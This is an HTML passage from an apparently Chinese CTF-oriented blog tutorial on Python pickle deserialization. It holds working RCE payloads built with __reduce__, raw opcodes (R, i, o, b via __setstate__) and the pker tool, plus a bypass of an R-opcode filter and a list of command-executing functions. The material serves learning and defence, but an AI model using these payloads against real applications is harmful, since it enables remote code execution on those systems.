class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    u = pickle._Unpickler(f)</span><br><span class="line">    u.encoding = <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">    p = u.load()</span><br></pre></td></tr></table></figure><p>pickle允许任意对象通过定义__reduce__方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__reduce__</span><br><span class="line">被定义之后，当对象被Pickle时就会被调用</span><br><span class="line">要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含<span class="number">2</span>到<span class="number">5</span>个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用</span><br><span class="line">__reduce_ex__</span><br><span class="line">首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</span><br></pre></td></tr></table></figure><p>编写漏洞代码__reduce__</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p>如果使用的是__reduce_ex__</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cmd = cmd</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce_ex__</span>(<span class="params">self,cmd</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="variable language_">self</span>.cmd,))</span><br><span class="line">a=test(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p>其中pickle.loads是会解决import问题，对于未引入的module会自动尝试import。</p><p>比如说我们直接执行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle;pickle.loads(<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>内置能够执行命令的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>,execfile,<span class="built_in">compile</span>,<span class="built_in">open</span>,file,<span class="built_in">map</span>,<span class="built_in">input</span>,os.system,os.popen,os.popen2,os.popen3,os.popen4,os.<span class="built_in">open</span>,os.pipe,os.listdir,os.access,os.execl,os.execle,os.execlp,os.execlpe,os.execv,os.execve,os.execvp,os.execvpe,os.spawnl,os.spawnle,os.spawnlp,os.spawnlpe,os.spawnv,os.spawnve,os.spawnvp,os.spawnvpe,pickle.load,pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.<span class="built_in">open</span>,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.<span class="built_in">open</span>,posixfile.fileopen,platform.popen</span><br></pre></td></tr></table></figure><h4 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h4><p>不同的操作码对应不同的动作，接下来开始学习PVM是如何运作opcode的。我们需要知道的是：PVM引擎会识别opcode中不同的指令码，从而进行相应的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">data=<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">name</th><th align="left">op</th><th align="left">params</th><th align="left">describe</th><th align="left">e.g.</th></tr></thead><tbody><tr><td align="left">MARK</td><td align="left">(</td><td align="left">null</td><td align="left">向栈顶push一个MARK</td><td align="left"></td></tr><tr><td align="left">STOP</td><td align="left">.</td><td align="left">null</td><td align="left">结束</td><td align="left"></td></tr><tr><td align="left">POP</td><td align="left">0</td><td align="left">null</td><td align="left">丢弃栈顶第一个元素</td><td align="left"></td></tr><tr><td align="left">POP_MARK</td><td align="left">1</td><td align="left">null</td><td align="left">丢弃栈顶到MARK之上的第一个元素</td><td align="left"></td></tr><tr><td align="left">DUP</td><td align="left">2</td><td align="left">null</td><td align="left"></td><td align="left">在栈顶赋值一次栈顶元素</td></tr><tr><td align="left">FLOAT</td><td align="left">F</td><td align="left">F [float]</td><td align="left">push一个float</td><td align="left">F1.0</td></tr><tr><td align="left">INT</td><td align="left">I</td><td align="left">I [int]</td><td align="left">push一个integer</td><td align="left">I1</td></tr><tr><td align="left">NONE</td><td align="left">N</td><td align="left">null</td><td align="left">push一个None</td><td align="left"></td></tr><tr><td align="left">REDUCE</td><td align="left">R</td><td align="left">[callable] [tuple] R</td><td align="left">调用一个callable对象</td><td align="left">crandom\nRandom\n)R</td></tr><tr><td align="left">STRING</td><td align="left">S</td><td align="left">S [string]</td><td align="left">push一个string</td><td align="left">S ‘x’</td></tr><tr><td align="left">UNICODE</td><td align="left">V</td><td align="left">V [unicode]</td><td align="left">push一个unicode string</td><td align="left">V ‘x’</td></tr><tr><td align="left">APPEND</td><td align="left">a</td><td align="left">[list] [obj] a</td><td align="left">向列表append单个对象 ]I100\na</td><td align="left"></td></tr><tr><td align="left">BUILD</td><td align="left">b</td><td align="left">[obj] [dict] b</td><td align="left">添加实例属性（修改__dict__）</td><td align="left">cmodule\nCls\n)R(I1\nI2\ndb</td></tr><tr><td align="left">GLOBAL</td><td align="left">c</td><td align="left">c [module] [name]</td><td align="left">调用Pickler的find_class，导入module.name并push到栈顶</td><td align="left">cos\nsystem\n</td></tr><tr><td align="left">DICT</td><td align="left">d</td><td align="left">MARK [[k] [v]…] d</td><td align="left">将栈顶MARK以前的元素弹出构造dict，再push回栈顶</td><td align="left">(I0\nI1\nd</td></tr><tr><td align="left">EMPTY_DICT } null push一个空dict</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">APPENDS</td><td align="left">e</td><td align="left">[list] MARK [obj…] e</td><td align="left">将栈顶MARK以前的元素append到前一个的list ](I0\ne</td><td align="left"></td></tr><tr><td align="left">GET</td><td align="left">g</td><td align="left">g [index]</td><td align="left">从memo获取元素</td><td align="left">g0</td></tr><tr><td align="left">INST</td><td align="left">i</td><td align="left">MARK [args…] i [module] [cls]</td><td align="left">构造一个类实例（其实等同于调用一个callable对象），内部调用了find_class</td><td align="left">(S’ls’\nios\nsystem\n</td></tr><tr><td align="left">LIST</td><td align="left">l</td><td align="left">MARK [obj] l</td><td align="left">将栈顶MARK以前的元素弹出构造一个list，再push回栈顶</td><td align="left">(I0\nl</td></tr><tr><td align="left">EMPTY_LIST</td><td align="left">]</td><td align="left">null</td><td align="left">push一个空list</td><td align="left"></td></tr><tr><td align="left">OBJ</td><td align="left">o</td><td align="left">MARK [callable] [args…] o</td><td align="left">同INST，参数获取方式由readline变为stack.pop而已</td><td align="left">(cos\nsystem\nS’ls’\no</td></tr><tr><td align="left">PUT</td><td align="left">p</td><td align="left">p [index]</td><td align="left">将栈顶元素放入memo</td><td align="left">p0</td></tr><tr><td align="left">SETITEM</td><td align="left">s</td><td align="left">[dict] [k] [v] s</td><td align="left">设置dict的键值 }I0\nI1\ns</td><td align="left"></td></tr><tr><td align="left">TUPLE</td><td align="left">t</td><td align="left">MARK [obj…] t</td><td align="left">将栈顶MARK以前的元素弹出构造tuple，再push回栈顶</td><td align="left">(I0\nI1\nt</td></tr><tr><td align="left">EMPTY_TUPLE</td><td align="left">)</td><td align="left">null</td><td align="left">push一个空tuple</td><td align="left"></td></tr><tr><td align="left">SETITEMS</td><td align="left">u</td><td align="left">[dict] MARK [[k] [v]…] u</td><td align="left">将栈顶MARK以前的元素弹出update到前一个dict }(I0\nI1\nu</td><td align="left"></td></tr><tr><td align="left"><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/5.32hr8ytykz.gif" alt="Alt pic"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">三种常见的操作符R（可以执行命令）、i（可以执行命令）、o（可以执行命令），还有一些不常见的c（可以进行变量覆盖）、b（可以执行命令）等，三种常见的如下</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure><p>R操作符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil(),protocol=<span class="number">0</span>))  <span class="comment"># protocol表示协议版本</span></span><br><span class="line">pickletools.dis(pickle.dumps(Evil(),protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>输入的内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;cos\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">23</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">26</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">27</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">30</span>: R    REDUCE</span><br><span class="line">   <span class="number">31</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">34</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看见opcode第一行导入的是一个os system，这是Linux上的。如果想要在Windows上面使用的话，就得导入nt system模块。如果要避免这种限制需要使用通过AST来构造opcode。<a href="https://github.com/eddieivan01/pker">下载</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text.txt</span></span><br><span class="line"><span class="comment"># 重载了__import__ os，不然如果使用安全函数是无法自动导入包的</span></span><br><span class="line">os = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)(os, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>输入命令python3 pker.py &lt; text.txt即可生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;c__builtin__\n__import__\n(S&#x27;os&#x27;\ntRp0\n0c__builtin__\ngetattr\n(g0\nS&#x27;system&#x27;\ntRp1\n0g1\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure><p>利用pickletools.dis()转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ __import__&#x27;</span></span><br><span class="line">   <span class="number">24</span>: (    MARK</span><br><span class="line">   <span class="number">25</span>: S        STRING     <span class="string">&#x27;os&#x27;</span></span><br><span class="line">   <span class="number">31</span>: t        TUPLE      (MARK at <span class="number">24</span>)</span><br><span class="line">   <span class="number">32</span>: R    REDUCE</span><br><span class="line">   <span class="number">33</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">36</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">37</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ getattr&#x27;</span></span><br><span class="line">   <span class="number">58</span>: (    MARK</span><br><span class="line">   <span class="number">59</span>: g        GET        <span class="number">0</span></span><br><span class="line">   <span class="number">62</span>: S        STRING     <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">72</span>: t        TUPLE      (MARK at <span class="number">58</span>)</span><br><span class="line">   <span class="number">73</span>: R    REDUCE</span><br><span class="line">   <span class="number">74</span>: p    PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">77</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">78</span>: g    GET        <span class="number">1</span></span><br><span class="line">   <span class="number">81</span>: (    MARK</span><br><span class="line">   <span class="number">82</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">92</span>: t        TUPLE      (MARK at <span class="number">81</span>)</span><br><span class="line">   <span class="number">93</span>: R    REDUCE</span><br><span class="line">   <span class="number">94</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>上面内容简化下就和上面第一个结构体一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>pker语句就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未使用安全重载语句的代码会自动import os这个包，所以不需要__builtin__.__import__ 去导入</span></span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>i操作符<br>pker语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>o操作符</p><p>pker语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>o操作符</p><p>pker语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">o.</span><br></pre></td></tr></table></figure><p>上面这三种都是直接去调用os模块，没有用__builtin__.<strong>import</strong> 去导入，这是因为上面已经提到了pickle.loads会解决import问题，整个python标准库的模块函数均可以使用。<br>c操作符</p><p>其实c操作符是基于find_class(moudle, name)来实现的，find_class()函数实现的功能简单来说就是：去moudle模块中找到name，然后对内存原始的数据进行覆盖。但是需要注意的是，moudle必须在name的顶层。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name = <span class="string">&#x27;jnzm4x8vgb&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;cnqbio0yxa9htwkev61ps&#125;&#x27;</span></span><br><span class="line">sign = <span class="string">&#x27;gy3z9urcn2as7f05ot8b&#x27;</span></span><br><span class="line"><span class="comment"># c_flag.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pickle_test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,sign</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> pickle_test <span class="keyword">and</span> <span class="variable language_">self</span>.name == other.name <span class="keyword">and</span> <span class="variable language_">self</span>.sign == other.sign</span><br><span class="line"></span><br><span class="line">ser = base64.b64decode(<span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ser)</span><br><span class="line"><span class="comment"># 过滤R操作符，防止危险函数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> ser:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = pickle.loads(ser)</span><br><span class="line">    correct = ((result == pickle_test(secret.name, secret.sign)))</span><br><span class="line">    <span class="keyword">if</span> correct:</span><br><span class="line">        <span class="built_in">print</span>(secret.flag)</span><br></pre></td></tr></table></figure><p>直接使用pkel进行生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">admin.name = <span class="string">&quot;test_name&quot;</span></span><br><span class="line">admin.sign = <span class="string">&quot;123456&quot;</span></span><br><span class="line">pickle_test = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;pickle_test&#x27;</span>,<span class="string">&#x27;test_name&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> pickle_test</span><br></pre></td></tr></table></figure><p>然后把结果进行base64下，必须使用python的来编码，因为数据类型是字节类型，网页上的是字符型编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">code=<span class="string">b&quot;c__main__\nsecret\np0\n0g0\n(&#125;(S&#x27;name&#x27;\nS&#x27;test_name&#x27;\ndtbg0\n(&#125;(S&#x27;sign&#x27;\nS&#x27;123456&#x27;\ndtb(S&#x27;test_name&#x27;\nS&#x27;123456&#x27;\ni__main__\npickle_test\np3\n0g3\n.&quot;</span></span><br><span class="line"><span class="comment">#print(pickletools.dis(code))</span></span><br><span class="line">a=base64.b64encode(code)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/6.6m3oyrwod0.jpg" alt="Alt pic"><br>b操作符</p><p>对已有的一个类使用__setstate__()方法进行覆盖</p><pre><code>当解封时，如果类定义了 __setstate__()，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 dict。</code></pre><p>如果一个类（暂且称之为Test），它原先是没有定义__setstate__方法的，如果我们现在使用{“<strong>setstate</strong>“: os.system}这个字典来初始化test类的对象（b操作符），现在这个对象便具有了__setstate__方法，之后我们再把待执行的命令作为参数（以whoami为例），再次使用b操作符来执行BUILD指令，由于此时对象存在__setstate__方法，所以便会执行os.system(‘whoami’)，成功实现了RCE。</p><p>构建代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">date = <span class="string">b&#x27;c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#x27;</span></span><br><span class="line">pickletools.dis(date)</span><br><span class="line">pickle.loads(date)</span><br></pre></td></tr></table></figure><p>重写find_class()：不一定绝对安全</p><p>官方给出的安全反序列化是继承了pickle.Pickler类，并重载了find_class方法，父类原本的操作是把module导入sys.module缓存中（并未导入全局或局部作用域），然后getattr取值，所以重载该方法后即可对module和name进行限制，但find_class的限制仅仅是对该函数参数过滤，并没有hook __import__等函数，所以通过eval(‘<strong>import</strong>(&#39;xx&#39;)’)等即可绕过。</p><p>下面的例子来自于python官方文档，通过白名单来现在函数运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>而我们做题一般都是遇到使用黑名单来操作的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span 